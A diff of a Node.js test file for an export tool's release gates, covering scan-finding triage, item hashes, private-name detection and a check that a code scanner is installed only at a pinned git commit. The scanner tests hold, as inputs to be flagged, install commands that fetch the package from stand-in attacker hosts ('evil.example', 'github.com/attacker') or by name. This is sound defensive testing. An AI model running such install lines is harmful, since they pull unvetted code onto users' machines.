@@ -1,11 +1,12 @@
 // tools/export/test/gates.test.mjs
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
+import { fileURLToPath } from 'node:url';
 import { deflateRawSync } from 'node:zlib';
-import { walkFiles, gateSecrets, gatePrivacy, gatePaths, gateAccounting, gateLinks, gateNotes, gateDiagramUrls, gateTriage, gateRisky, gateStudioBlocks, gateMarkers, MARKERS_ALLOW, gateNames, NAMES_ALLOW, gateJson, shebangFiles } from '../gates.mjs';
+import { walkFiles, gateSecrets, gatePrivacy, gatePaths, gateAccounting, gateLinks, gateNotes, gateDiagramUrls, gateTriage, gateRisky, gateStudioBlocks, gateMarkers, MARKERS_ALLOW, gateNames, NAMES_ALLOW, gateJson, shebangFiles, gateScanner, SCANNER_ALLOW } from '../gates.mjs';
 
 function kit(files) {
   const root = mkdtempSync(path.join(os.tmpdir(), 'kit-gates-'));
@@ -177,6 +178,10 @@ test('risky: an allowed phrase passes only in its own file, and only on its line
   } finally { rmSync(root, { recursive: true, force: true }); }
 });
 
+test('risky: the kit itself passes its risky gate, hand-written files included', () => {
+  assert.deepEqual(gateRisky(fileURLToPath(new URL('../../../', import.meta.url))), []);
+});
+
 test('risky: an image with neither a tag nor a digest, in a Dockerfile, a YAML file or a fenced block', () => {
   const fence = '```';
   const root = kit({
@@ -235,7 +240,7 @@ test('accounting: PRINCIPLES.md is a hand-written file', () => {
 });
 
 test('accounting: stray catalog files, unknown encodings, unknown locations, unlicensed third-party skills, external items without licence', () => {
-  const root = kit({ 'catalog/INDEX.md': 'i', 'catalog/stray.md': 's', 'modules/u.md': Buffer.from('﻿hi', 'utf16le'), 'modules/x.md': 'm', 'random.txt': 'r' });
+  const root = kit({ 'catalog/INDEX.md': 'i', 'catalog/stray.md': 's', 'modules/u.md': Buffer.from('\uFEFFhi', 'utf16le'), 'modules/x.md': 'm', 'random.txt': 'r' });
   try {
     const manifest = { items: [{ id: 'tool', kind: 'external', status: 'link-only', pack: 'foundation', upstream: 'u' }] };
     assert.deepEqual(gateAccounting(root, { written: ['catalog/INDEX.md'], notices: [{ id: 'b', licenceFile: null }], manifest }), [
@@ -269,43 +274,109 @@ test('notes: a --note naming the block marker fails, since the changelog it land
   assert.deepEqual(gateNotes(['Fine.', `Hub text in ${only.toUpperCase()} blocks is cut.`], []), [`--note 2: ${only} marker left in shipped text`]);
 });
 
-const scanOf = (recommendation, score, findings) => ({ recommendation, score, ...(findings === undefined ? {} : { findings }), version: 'v2.2.3', date: '2026-11-09' });
-const readOf = (recommendation, score, findings, fp, byDesign, other = 0) => ({ recommendation, score, findings, fp, byDesign, other, anchor: 'a' });
+const scanOf = (recommendation, score, findings) => ({ recommendation, score, ...(findings === undefined ? {} : { findings }), version: 'v2.13.6', date: '2026-11-21' });
+const readOf = (recommendation, score, rows) => ({ recommendation, score, rows, anchor: 'a' });
+const fnd = (rule, file, line, severity = 'HIGH') => ({ rule, file, line, severity });
+const row = (rule, file, line, verdict = 'FP') => ({ rule, file, line, verdict });
 
-test('triage: every item whose last scan is not SAFE needs a triage section for that scan, every finding read, none judged real', () => {
+test('triage: rows that match the recorded findings one to one pass, a finding found twice included; a SAFE scan with no findings needs no section', () => {
+  const found = [fnd('LP3', 'SKILL.md', 1, 'MEDIUM'), fnd('SC1', 'refs/a.md', null, 'LOW'), fnd('TM1', 'scripts/s.sh', 2), fnd('TM1', 'scripts/s.sh', 2)];
+  const scans = { ok: scanOf('DO_NOT_INSTALL', 100, found), clean: scanOf('SAFE', 0, []) };
+  const triage = { ok: readOf('DO_NOT_INSTALL', 100, [row('TM1', 'scripts/s.sh', 2), row('LP3', 'SKILL.md', 1, 'BY DESIGN'), row('TM1', 'scripts/s.sh', 2), row('SC1', 'refs/a.md', null)]) };
+  assert.deepEqual(gateTriage({ keys: ['ok', 'clean'], scans, triage }), []);
+});
+
+test('triage: a recorded finding with no row fails, and so does a row that matches no recorded finding', () => {
   const scans = {
-    safe: scanOf('SAFE', 10, 1), ok: scanOf('DO_NOT_INSTALL', 100, 3), none: scanOf('CAUTION', 25, 1), rescanned: scanOf('CAUTION', 35, 1),
-    partial: scanOf('CAUTION', 25, 3), real: scanOf('DO_NOT_INSTALL', 60, 2), 'not-shipped': scanOf('DO_NOT_INSTALL', 100, 9),
+    missing: scanOf('CAUTION', 25, [fnd('SC1', 'refs/a.md', null), fnd('TM1', 'scripts/s.sh', 2), fnd('TM1', 'scripts/s.sh', 2)]),
+    extra: scanOf('CAUTION', 25, [fnd('TM1', 'scripts/s.sh', 2)]),
   };
   const triage = {
-    ok: readOf('DO_NOT_INSTALL', 100, 3, 2, 1), rescanned: readOf('CAUTION', 25, 1, 1, 0),
-    partial: readOf('CAUTION', 25, 3, 1, 0), real: readOf('DO_NOT_INSTALL', 60, 2, 1, 0, 1),
+    missing: readOf('CAUTION', 25, [row('TM1', 'scripts/s.sh', 2)]),
+    extra: readOf('CAUTION', 25, [row('TM1', 'scripts/s.sh', 2), row('TM1', 'scripts/s.sh', 3)]),
   };
-  assert.deepEqual(gateTriage({ keys: ['safe', 'ok', 'none', 'rescanned', 'partial', 'real'], scans, triage }), [
-    'none: last scan CAUTION (25/100), and tools/export/scan-triage.md has no section for it; read every finding and add one',
-    'rescanned: last scan CAUTION (35/100), but its triage section is for CAUTION (25/100); triage the new scan',
-    'partial: the triage reads 1 of its 3 findings',
-    'real: 1 finding judged neither FP nor BY DESIGN; a real finding is fixed or the item is withheld, never shipped',
+  assert.deepEqual(gateTriage({ keys: ['missing', 'extra'], scans, triage }), [
+    'missing: finding SC1 refs/a.md has no triage row',
+    'missing: finding TM1 scripts/s.sh:2 has no triage row',
+    'extra: triage row TM1 scripts/s.sh:3 matches no recorded finding',
   ]);
 });
 
-test('triage: a rescan with the same verdict and score but another number of findings fails, and so does a scan with no count', () => {
-  const scans = { capped: scanOf('DO_NOT_INSTALL', 100, 35), uncounted: scanOf('CAUTION', 25) };
-  const triage = { capped: readOf('DO_NOT_INSTALL', 100, 36, 28, 8), uncounted: readOf('CAUTION', 25, 1, 1, 0) };
-  assert.deepEqual(gateTriage({ keys: ['capped', 'uncounted'], scans, triage }), [
-    'capped: the last scan has 35 findings, but its triage section is for 36; triage the new scan',
-    'uncounted: scans.json records no number of findings for its last scan; run node tools/export/scan.mjs again',
+test('triage: a row judged neither FP nor BY DESIGN fails', () => {
+  const scans = { real: scanOf('DO_NOT_INSTALL', 60, [fnd('PE3', 'x.cjs', 5), fnd('TM1', 't.sh', 3)]) };
+  const triage = { real: readOf('DO_NOT_INSTALL', 60, [row('PE3', 'x.cjs', 5, 'REAL'), row('TM1', 't.sh', 3)]) };
+  assert.deepEqual(gateTriage({ keys: ['real'], scans, triage }), [
+    'real: triage row PE3 x.cjs:5 is judged REAL, neither FP nor BY DESIGN; a real finding is fixed or the item is withheld, never shipped',
+  ]);
+});
+
+test('triage: a SAFE scan with findings is checked like any other', () => {
+  const scans = { bare: scanOf('SAFE', 10, [fnd('LP3', 'SKILL.md', 1)]), read: scanOf('SAFE', 10, [fnd('LP3', 'SKILL.md', 1), fnd('TM1', 'a.sh', 4)]) };
+  const triage = { read: readOf('SAFE', 10, [row('LP3', 'SKILL.md', 1, 'BY DESIGN')]) };
+  assert.deepEqual(gateTriage({ keys: ['bare', 'read'], scans, triage }), [
+    'bare: last scan SAFE (10/100), and tools/export/scan-triage.md has no section for it; read every finding and add one',
+    'read: finding TM1 a.sh:4 has no triage row',
+  ]);
+});
+
+test('triage: a section for another verdict or score fails, and so does a scan that records no list of findings', () => {
+  const scans = { none: scanOf('CAUTION', 25, [fnd('TM1', 'a.sh', 1)]), rescanned: scanOf('CAUTION', 35, [fnd('TM1', 'a.sh', 1)]), counted: scanOf('SAFE', 0, 0), unlisted: scanOf('CAUTION', 25) };
+  const triage = { rescanned: readOf('CAUTION', 25, [row('TM1', 'a.sh', 1)]), unlisted: readOf('CAUTION', 25, [row('TM1', 'a.sh', 1)]) };
+  assert.deepEqual(gateTriage({ keys: ['none', 'rescanned', 'counted', 'unlisted'], scans, triage }), [
+    'none: last scan CAUTION (25/100), and tools/export/scan-triage.md has no section for it; read every finding and add one',
+    'rescanned: last scan CAUTION (35/100), but its triage section is for CAUTION (25/100); triage the new scan',
+    'counted: scans.json records no list of findings for its last scan; run node tools/export/scan.mjs again',
+    'unlisted: scans.json records no list of findings for its last scan; run node tools/export/scan.mjs again',
+  ]);
+});
+
+test('triage: a heading whose count of findings differs from its rows fails; a table with no File:line column is one finding for the section', () => {
+  const scans = { counted: scanOf('CAUTION', 25, [fnd('TM1', 'a.sh', 1)]), right: scanOf('CAUTION', 25, [fnd('TM1', 'a.sh', 1)]), nowhere: scanOf('CAUTION', 25, [fnd('TM1', 'a.sh', 1)]) };
+  const triage = {
+    counted: { ...readOf('CAUTION', 25, [row('TM1', 'a.sh', 1)]), count: 3 },
+    right: { ...readOf('CAUTION', 25, [row('TM1', 'a.sh', 1)]), count: 1 },
+    nowhere: { ...readOf('CAUTION', 25, [{ rule: 'TM1', file: '', line: null, verdict: 'FP' }]), noFileLine: true },
+  };
+  assert.deepEqual(gateTriage({ keys: ['counted', 'right', 'nowhere'], scans, triage }), [
+    'counted: heading says 3 findings, the section has 1 rows',
+    'the triage table for nowhere has no File:line column',
   ]);
 });
 
 test('triage: two sections for one item fail; an item with no scan fails only at a release', () => {
-  const scans = { twice: scanOf('CAUTION', 25, 1) };
-  const triage = { twice: { ...readOf('CAUTION', 25, 1, 1, 0), duplicate: true } };
+  const scans = { twice: scanOf('CAUTION', 25, [fnd('TM1', 'a.sh', 1)]) };
+  const triage = { twice: { ...readOf('CAUTION', 25, [row('TM1', 'a.sh', 1)]), duplicate: true } };
   assert.deepEqual(gateTriage({ keys: ['twice', 'unscanned'], scans, triage }), [
     'twice: tools/export/scan-triage.md has more than one section for it; keep one',
   ]);
   assert.deepEqual(gateTriage({ keys: ['unscanned'], scans, triage, release: true }), [
     'unscanned: no scan in scans.json; a release ships only scanned items (node tools/export/scan.mjs)',
+  ]);
+});
+
+test('triage: at a release, an item whose content changed since its scan fails, whatever its verdict, and so does a scan with no itemHash', () => {
+  const scans = {
+    same: { ...scanOf('SAFE', 0, []), itemHash: 'aaaa' },
+    edited: { ...scanOf('CAUTION', 25, [fnd('TM1', 'a.sh', 1)]), itemHash: 'bbbb' },
+    quiet: { ...scanOf('SAFE', 0, []), itemHash: 'cccc' },
+    old: scanOf('SAFE', 0, []),
+  };
+  const triage = { edited: readOf('CAUTION', 25, [row('TM1', 'a.sh', 1)]) };
+  const hashes = { same: 'aaaa', edited: 'b000', quiet: 'c000', old: 'dddd' };
+  const keys = ['same', 'edited', 'quiet', 'old'];
+  assert.deepEqual(gateTriage({ keys, scans, triage, release: true, hashes }), [
+    'edited: the item changed since its scan; rescan and re-read its triage',
+    'quiet: the item changed since its scan; rescan and re-read its triage',
+    'old: scans.json records no itemHash for its last scan; rescan it (node tools/export/scan.mjs)',
+  ]);
+  // A dry run must still write the changed catalog, so that it can be scanned: no hash finding there.
+  assert.deepEqual(gateTriage({ keys, scans, triage, hashes }), []);
+  // At a release, an item the export could not hash fails: no hashes at all, or none for that key.
+  assert.deepEqual(gateTriage({ keys: ['same', 'quiet'], scans, triage, release: true, hashes: { same: 'aaaa' } }), [
+    'quiet: the export could not hash it, so its scan cannot be tied to what ships',
+  ]);
+  assert.deepEqual(gateTriage({ keys: ['same'], scans, triage, release: true }), [
+    'same: the export could not hash it, so its scan cannot be tied to what ships',
   ]);
 });
 
@@ -394,6 +465,85 @@ test('names: a private studio name, in whole inline code or in [[brackets]], is 
   } finally { rmSync(root, { recursive: true, force: true }); }
 });
 
+test('names: a studio name in the front matter description, as plain text, is found in any case and as a whole word', () => {
+  const allow = [{ file: 'catalog/skills/e/SKILL.md', name: 'save-session', why: 'an outside tool of the same name' }];
+  const root = kit({
+    'catalog/skills/a/SKILL.md': ['---', 'name: a', 'description: Use at the end. Pairs with Save-Session.', '---', 'Body: save-session in prose is not a citation.'].join('\n'),
+    'catalog/skills/b/SKILL.md': ['---', 'name: b', 'description: >-', '  Use when stuck.', '  Pairs with claude-md-curator and handoff', 'metadata:', '  note: save-session', '---', ''].join('\r\n'),
+    'catalog/skills/c/SKILL.md': ['---', 'name: c', 'description: Run `save-session` first, then save-session again.', '---', ''].join('\n'),
+    'catalog/skills/d/SKILL.md': ['---', 'name: d', 'description: "Not save-sessions, pre-save-session, save-session-notes or claude-md-curator_x; teach is shipped."', '---', ''].join('\n'),
+    'catalog/skills/e/SKILL.md': ['---', 'name: e', 'description: Pairs with save-session.', '---', ''].join('\n'),
+    'catalog/a.md': ['No front matter.', 'description: save-session'].join('\n'),
+    'cards/a.md': '---\ndescription: Pairs with save-session.\n---\n',
+  });
+  try {
+    assert.deepEqual(gateNames(root, NAMES, allow), [
+      'catalog/skills/a/SKILL.md:3 names save-session, which the kit does not ship',
+      'catalog/skills/b/SKILL.md:5 names claude-md-curator, which the kit does not ship',
+      'catalog/skills/c/SKILL.md:3 names save-session, which the kit does not ship',
+    ]);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('names: a private name in the front matter description is found without printing it', () => {
+  const names = { ...NAMES, private: ['quiet-job'] };
+  const allow = [{ file: 'catalog/skills/a/SKILL.md', name: 'quiet-job', why: 'never honoured for a private name' }];
+  const root = kit({ 'catalog/skills/a/SKILL.md': ['---', 'name: a', 'description: Pairs with Quiet-Job.', '---', ''].join('\n') });
+  try {
+    const found = gateNames(root, names, allow);
+    assert.deepEqual(found, ['catalog/skills/a/SKILL.md:3 names a private studio item (on the private list, private.local.txt, or in a hub pack whose pack.json says public: false)']);
+    assert.ok(!found.join('\n').toLowerCase().includes('quiet'), 'a private name is never printed');
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('names: in a description, a one-word studio name is ordinary prose and passes; a one-word private name is still found, masked', () => {
+  const names = { studio: [...NAMES.studio, 'launch', 'pricing'], shipped: NAMES.shipped, private: ['quietude'] };
+  const root = kit({
+    'catalog/skills/a/SKILL.md': ['---', 'name: a', 'description: Use for a narrated launch video, Pricing pages and save-session.', '---', ''].join('\n'),
+    'catalog/skills/b/SKILL.md': ['---', 'name: b', 'description: Use in Quietude.', '---', ''].join('\n'),
+    'catalog/skills/c/SKILL.md': ['---', 'name: c', 'description: Use after `launch`.', '---', ''].join('\n'),
+  });
+  try {
+    const found = gateNames(root, names);
+    assert.deepEqual(found, [
+      'catalog/skills/a/SKILL.md:3 names save-session, which the kit does not ship',
+      'catalog/skills/b/SKILL.md:3 names a private studio item (on the private list, private.local.txt, or in a hub pack whose pack.json says public: false)',
+      'catalog/skills/c/SKILL.md:3 names launch, which the kit does not ship',
+    ]);
+    assert.ok(!found.join('\n').toLowerCase().includes('quietude'), 'a private name is never printed');
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('names: a fence inside a blockquote is a fence, and its body is skipped', () => {
+  const root = kit({
+    'catalog/a.md': [
+      `> ${FENCE3}md`, '> Run `save-session`.', `> ${FENCE3}`,
+      `>> ~~~`, '>> See [[claude-md-curator]].', '>>~~~',
+      `  > > ${FENCE3}`, '  > > `save-session`', `  > > ${FENCE3}`,
+      '> `save-session` in a quote, outside any fence.',
+    ].join('\n'),
+  });
+  try {
+    assert.deepEqual(gateNames(root, NAMES), ['catalog/a.md:10 names save-session, which the kit does not ship']);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('names: a fence inside a blockquote ends with its blockquote, and a quoted fence line inside an outer fence is its text', () => {
+  const root = kit({
+    'catalog/a.md': ['> ~~~', '> code', '', 'Run `save-session` now.'].join('\n'),
+    'catalog/b.md': [`> ${FENCE3}`, '> code', 'Then [[claude-md-curator]].', `>> ${FENCE3}`, '>> code', '> `save-session` in the outer quote.'].join('\n'),
+    'catalog/c.md': [`${FENCE3}md`, `> ${FENCE3}`, '> `save-session` in an example', `> ${FENCE3}`, '[[claude-md-curator]] still in the example', FENCE3, '`save-session` after.'].join('\n'),
+  });
+  try {
+    assert.deepEqual(gateNames(root, NAMES), [
+      'catalog/a.md:4 names save-session, which the kit does not ship',
+      'catalog/b.md:3 names claude-md-curator, which the kit does not ship',
+      'catalog/b.md:6 names save-session, which the kit does not ship',
+      'catalog/c.md:7 names save-session, which the kit does not ship',
+    ]);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
 test('json: a file that parses passes; node_modules and local-only files are not read', () => {
   const root = kit({
     'catalog/skills/a/config.json': '{\n  "say": "hi \\"there\\""\n}\n',
@@ -421,6 +571,204 @@ test('json: a leading byte order mark fails, and the finding names it without pr
     assert.match(found[0], /^catalog\/features\.json: not valid JSON \(.*U\+FEFF.*\)$/);
     assert.ok(!found[0].includes('\uFEFF'), 'the invisible character is never printed');
   } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+// An invented commit id, 40 hex characters, and the scanner record that pins it.
+const PIN = 'a1'.repeat(20);
+const REPO = 'github.com/NVIDIA/skillspector.git';
+const SCANNER = { version: 'v9.9.9', tag: 'v9.9.9', commit: PIN, python: '3.13', install: `uv tool install --python 3.13 git+https://${REPO}@${PIN}` };
+const scanned = (version = 'v9.9.9') => ({ score: 0, recommendation: 'SAFE', findings: [], version, date: '2026-11-21' });
+
+test('scanner: passes when every install outside catalog/ carries the commit and every scan used the pinned version', () => {
+  const root = kit({
+    'docs/install.md': `Install SkillSpector v9.9.9:\n\n\`\`\`text\n${SCANNER.install}\n\`\`\`\n`,
+    'export.manifest.json': `{"install": "${SCANNER.install}"}\n`,
+    'tools/export/scanner.json': `${JSON.stringify(SCANNER)}\n`,
+    'catalog/skills/x/README.md': `uv tool install git+https://${REPO}\n`,
+    'tools/export/test/t.test.mjs': `const line = 'git+https://${REPO}';\n`,
+  });
+  try {
+    assert.deepEqual(gateScanner(root, SCANNER, { alpha: scanned(), beta: scanned() }), []);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('scanner: an install without @<commit> is one finding, naming file and line', () => {
+  const root = kit({ 'cards/a.md': `# A\nInstall: \`uv tool install --python 3.13 git+https://${REPO}\`\n`, 'docs/ok.md': `${SCANNER.install}\n` });
+  try {
+    const found = gateScanner(root, SCANNER, { alpha: scanned() });
+    assert.equal(found.length, 1, found.join('\n'));
+    assert.match(found[0], /^cards\/a\.md:2 /);
+    assert.ok(!found[0].includes('https://'), 'no remote URL in the finding');
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('scanner: any case of the repository name, a short commit or another commit fails too, once per line', () => {
+  const root = kit({
+    'export.manifest.json': `{"install": "uv tool install git+https://github.com/NVIDIA/SkillSpector.git"}\n`,
+    'docs/a.md': `x git+https://${REPO}@${PIN.slice(0, 12)}\ny git+https://${REPO}@${'b2'.repeat(20)} and git+https://${REPO}\nz ${SCANNER.install}\n`,
+  });
+  try {
+    assert.deepEqual(gateScanner(root, SCANNER, {}).map((f) => f.split(' ')[0]), ['docs/a.md:1', 'docs/a.md:2', 'export.manifest.json:1']);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('scanner: a scans.json entry made with another version is one finding naming the item and both versions', () => {
+  const root = kit({ 'docs/ok.md': `${SCANNER.install}\n` });
+  try {
+    const found = gateScanner(root, SCANNER, { alpha: scanned(), beta: scanned('v2.2.3') });
+    assert.equal(found.length, 1, found.join('\n'));
+    assert.match(found[0], /^tools\/export\/scans\.json: beta .*v2\.2\.3.*v9\.9\.9/);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('scanner: an allowed occurrence passes only inside its phrase, in its own file, wherever the line moves', () => {
+  const phrase = `The README's install is \`uv tool install git+https://${REPO}\``;
+  const allow = [{ file: 'docs/facts.md', phrase, why: 'quotes the upstream README' }];
+  // facts.md: a new line moves the quote to line 3; line 4 has the same URL outside the phrase.
+  const root = kit({
+    'docs/facts.md': `# Facts\nA new line above moves the quote.\n- ${phrase}.\nAlso: git+https://${REPO}\n`,
+    'docs/other.md': `# Other\n- ${phrase}.\n`,
+  });
+  try {
+    assert.deepEqual(gateScanner(root, SCANNER, {}, allow).map((f) => f.split(' ')[0]), ['docs/facts.md:4', 'docs/other.md:2']);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('scanner: an allow entry whose phrase is gone from its file is a finding; a missing file leaves it unused', () => {
+  const allow = [{ file: 'docs/facts.md', phrase: 'a quote that was removed', why: 'x' }, { file: 'docs/absent.md', phrase: 'y', why: 'z' }];
+  const root = kit({ 'docs/facts.md': '# Facts\nNothing quoted now.\n' });
+  try {
+    assert.deepEqual(gateScanner(root, SCANNER, {}, allow), ['docs/facts.md: a SCANNER_ALLOW entry\'s phrase is no longer in the file; remove the entry from gates.mjs']);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('scanner: only the git URL at the pinned commit installs or runs the scanner; any install or run by name fails, whatever version it names', () => {
+  // The name is not on PyPI, so a by-name line would get whatever code a later owner of the name publishes.
+  const lines = [
+    ['# A', false],
+    ['uv tool install git+https://github.com/nvidia/SkillSpector', true],
+    // Only the exact pinned URL passes: without .git, or another case of the owner, it is not that line.
+    [`uv tool install git+https://github.com/NVIDIA/skillspector@${PIN}`, true],
+    [`uv tool install --python 3.13 git+https://${REPO}@${PIN}`, false],
+    ['pip install skillspector', true],
+    ['pipx install --python 3.13 skillspector==9.9.8', true],
+    ['uv tool install skillspector==9.9.9', true],
+    ['uv pip install skillspector==9.9.9', true],
+    ['pip3 install --user skillspector==9.9.9', true],
+    [`pip install "skillspector @ git+https://${REPO}@${PIN}"`, false],
+    [`pip install "skillspector @ git+https://${REPO}"`, true],
+    ['uvx skillspector scan .', true],
+    ['uvx --python 3.13 skillspector==9.9.9 --version', true],
+    ['uvx --from skillspector==9.9.9 skillspector --version', true],
+    ['uv tool run skillspector --version', true],
+    [`uvx --python 3.13 --from git+https://${REPO}@${PIN} skillspector --version`, false],
+    [`uvx --from git+https://${REPO} skillspector --version`, true],
+    ['The source is at https://github.com/NVIDIA/SkillSpector, Apache-2.0.', false],
+    ['See https://github.com/NVIDIA/SkillSpector/releases/tag/v9.9.9 for the release.', false],
+    ['skillspector --version prints the version.', false],
+    ['Install it, with uv first, then SkillSpector v9.9.9, one pinned line.', false],
+  ];
+  const root = kit({ 'docs/a.md': lines.map(([l]) => l).join('\n') });
+  try {
+    const want = lines.map(([, bad], i) => (bad ? `docs/a.md:${i + 1}` : null)).filter(Boolean);
+    assert.deepEqual(gateScanner(root, SCANNER, {}, []).map((f) => f.split(' ')[0]), want);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+// Every line of the reviewer's probe (Part A, round 2): each form it found passing is now a finding, and
+// only the allowed forms pass. Three lines pass because they hold no scanner name and the gate reads one
+// line at a time; docs/MAINTAINING.md names those limits (a command continued on the next line, a
+// requirements file).
+test('scanner: every install or run that is not the pinned git URL fails, from the review probe; the pinned forms pass', () => {
+  const pinned = `git+https://${REPO}@${PIN}`;
+  const lines = [
+    ['python -m pip install skillspector', true],
+    ['py -3 -m pip install skillspector==2.13.6', true],
+    ['pip3 install "skillspector==2.13.6"', true],
+    ["pip install 'skillspector[all]'", true],
+    ['pip install SkillSpector', true],
+    ['pipx run skillspector scan .', true],
+    ['uv run --with skillspector skillspector scan .', true],
+    ['uv add skillspector', true],
+    ['poetry add skillspector', true],
+    ['conda install skillspector', true],
+    ['skillspector==2.13.6', true],
+    ['pip install -r requirements.txt', false], // limit: a requirements file is not read
+    ['pip install \\', false], // limit: the command goes on on the next line
+    ['  skillspector==2.13.6', true],
+    ['uvx --from', false], // limit: the value is on the next line
+    ['  skillspector==9 skillspector scan .', true],
+    ['uv tool install git+https://github.com/attacker/skillspector', true],
+    ['uv tool install git+https://github.com/NVIDIA/skillspector.git@main', true],
+    ['pip install "skillspector @ git+https://gitlab.com/x/skillspector"', true],
+    ['uvx --from git+https://github.com/attacker/skillspector skillspector scan .', true],
+    ['uv tool install git+ssh://git@github.com/NVIDIA/skillspector', true],
+    ['pip install https://github.com/NVIDIA/SkillSpector/archive/refs/heads/main.zip', true],
+    ['uvx --from=skillspector==9 skillspector', true],
+    [`uvx --from=${pinned} skillspector`, false],
+    [`uv tool install --python 3.13 ${pinned}`, false],
+    [`uvx --python 3.13 --from ${pinned} skillspector --version`, false],
+    ['Use `uvx --from` to name the source.', false],
+    ['uv tool upgrade skillspector', true],
+    ['pip install git+ssh://git@github.com/NVIDIA/skillspector.git', true],
+    ['git clone git@github.com:NVIDIA/skillspector.git', true],
+  ];
+  const root = kit({ 'docs/a.md': lines.map(([l]) => l).join('\n') });
+  try {
+    const want = lines.map(([, bad], i) => (bad ? `docs/a.md:${i + 1}` : null)).filter(Boolean);
+    assert.deepEqual(gateScanner(root, SCANNER, {}, []).map((f) => f.split(' ')[0]), want);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+// Part A, round 3: a percent-encoded name, a file named for the scanner on another host, and pip's
+// download and wheel verbs, which fetch and build the package by name.
+test('scanner: a percent-encoded name, a wheel or sdist from another host, and pip download or wheel by name fail', () => {
+  const lines = [
+    ['uv tool install git+https://github.com/NVIDIA/%73killspector', true],
+    ['uv tool install git+https://github.com/NVIDIA/%53kill%53pector.git@main', true],
+    ['pip install https://evil.example/skillspector-2.13.6-py3-none-any.whl', true],
+    ['pip install https://evil.example/pkgs/SkillSpector-2.13.6.tar.gz', true],
+    ['pip download skillspector', true],
+    ['pip wheel skillspector==2.13.6', true],
+    ['See https://example.com/100%zz/notes for the bad escape.', false],
+    [`uv tool install --python 3.13 git+https://${REPO}@${PIN}`, false],
+  ];
+  const root = kit({ 'docs/a.md': lines.map(([l]) => l).join('\n') });
+  try {
+    const want = lines.map(([, bad], i) => (bad ? `docs/a.md:${i + 1}` : null)).filter(Boolean);
+    assert.deepEqual(gateScanner(root, SCANNER, {}, []).map((f) => f.split(' ')[0]), want);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('scanner: the pinned URL is the one in scanner.json\'s install line, so a moved repository needs one edit', () => {
+  const moved = { ...SCANNER, install: `uv tool install --python 3.13 git+https://github.com/new-owner/skillspector.git@${PIN}` };
+  const root = kit({ 'docs/a.md': `${moved.install}\n${SCANNER.install}\n` });
+  try {
+    assert.deepEqual(gateScanner(root, moved, {}, []).map((f) => f.split(' ')[0]), ['docs/a.md:2']);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('scanner: an install line in scanner.json with no git URL at the pinned commit is a finding', () => {
+  const root = kit({ 'docs/a.md': '# A\n' });
+  try {
+    const found = gateScanner(root, { ...SCANNER, install: `uv tool install git+https://${REPO}@${'b2'.repeat(20)}` }, {}, []);
+    assert.deepEqual(found, ['tools/export/scanner.json: the install line has no git URL at the pinned commit']);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
+
+test('scanner: every SCANNER_ALLOW entry names a file, a phrase and why', () => {
+  for (const a of SCANNER_ALLOW) {
+    assert.equal(typeof a.file, 'string');
+    assert.ok(typeof a.phrase === 'string' && a.phrase.length > 20, `${a.file}: phrase`);
+    assert.ok(typeof a.why === 'string' && a.why.length > 0, `${a.file}: why`);
+  }
+});
+
+test('scanner: the kit itself passes its scanner gate, with its own scanner.json and scans.json', () => {
+  const root = fileURLToPath(new URL('../../../', import.meta.url));
+  const scanner = JSON.parse(readFileSync(path.join(root, 'tools/export/scanner.json'), 'utf8'));
+  const scans = JSON.parse(readFileSync(path.join(root, 'tools/export/scans.json'), 'utf8'));
+  assert.deepEqual(gateScanner(root, scanner, scans), []);
 });
 
 test('shebangFiles: files under the given folders whose first two bytes are #!, sorted, relative with /', () => {
